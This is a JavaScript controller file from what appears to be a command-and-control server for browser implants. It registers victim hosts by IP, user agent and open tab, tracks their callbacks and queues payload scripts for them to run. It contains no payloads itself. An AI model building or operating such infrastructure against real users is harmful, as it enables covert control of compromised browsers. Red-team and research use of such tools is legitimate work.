const Host = require("../models/Host");
const Implant = require("../models/Implant");
const { getPayloadByName } = require("./payloadControllers");

module.exports.registerHost = async (req, res) => {
    if(req.body.associatedImplant !== undefined){
        try {
            const implant = await Implant.findById(req.body.associatedImplant);
            if(implant){
                Host.create({
                        externalIP: req.body.externalIP,
                        userAgent: req.body.userAgent,
                        currentTab: req.body.currentTab,
                        associatedImplant: req.body.associatedImplant,
                        offlineAfter: implant.callbackInterval/1000 + implant.maxJitter/1000 + 30 // Used to mark a host as offline if it doesnt callback after the interval + maximum jitter + 30 seconds
                    }).then((host) => {
                        res.status(200).json({
                            id: host._id.toString(),
                            initialPayload: implant.initialPayload
                        });
                    }).catch((err) => {
                        res.status(400).json(err);
                    });
            } else {
                res.status(400).json({message: "Implant not found"});
            }
        } catch (err) {
            res.status(400).json({
                status: "fail",
                message: err.message
            });
        }
    }
};

module.exports.getAllHosts = async function (req, res){
    try {
        const hosts = await Host.find();
        res.status(200).json(hosts);
    } catch (err) {
        res.status(400).json(err);
    }
}

module.exports.addPayloadToQueue = async function (payloadName, hostId, username){
    try {
        let payload = {}
        payload.name = payloadName;
        payload.script = await getPayloadByName(payloadName);
        payload.script = payload.script.payload;
        payload.author = username;
        // Add collision detection
        payload.id = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        const host = await Host.findById(hostId);
        host.queue.push(payload);
        await host.save();
    } catch (err) {
        console.log(err);
    }
};

module.exports.checkIn = async function (hostId){
    try {
        const host = await Host.findById(hostId);
        host.lastCheckIn = Date.now();
        await host.save();
    } catch (err) {
        console.log(err);
    }
}